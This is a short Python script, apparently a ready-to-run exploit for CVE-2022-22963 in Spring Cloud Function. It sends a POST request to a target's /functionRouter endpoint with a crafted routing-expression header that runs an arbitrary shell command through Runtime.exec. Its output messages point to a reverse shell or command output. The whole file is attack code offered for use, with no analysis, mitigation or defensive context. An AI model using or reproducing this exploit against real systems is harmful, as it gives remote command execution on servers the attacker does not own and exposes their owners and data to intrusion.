# CVE-2022-22963 - Spring Cloud Function RCE Exploit
import sys
import requests

def exploit(target, port, cmd):
    url = f"http://{target}:{port}/functionRouter"
    headers = {
        "spring.cloud.function.routing-expression": f"T(java.lang.Runtime).getRuntime().exec(\"{cmd}\")",
        "Content-Type": "text/plain"
    }

    try:
        response = requests.post(url, headers=headers, data="test")  # <-- FIXED HERE
        print("[+] Exploit sent successfully!")
        print("[+] Check your reverse shell or command output if applicable.")
        print("[*] HTTP Response code:", response.status_code)
        print("[*] Response body:\n", response.text)
    except Exception as e:
        print("[-] Exploit failed:", str(e))

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <port> <command>")
        sys.exit(1)

    target = sys.argv[1]
    port = sys.argv[2]
    cmd = sys.argv[3]

    exploit(target, port, cmd)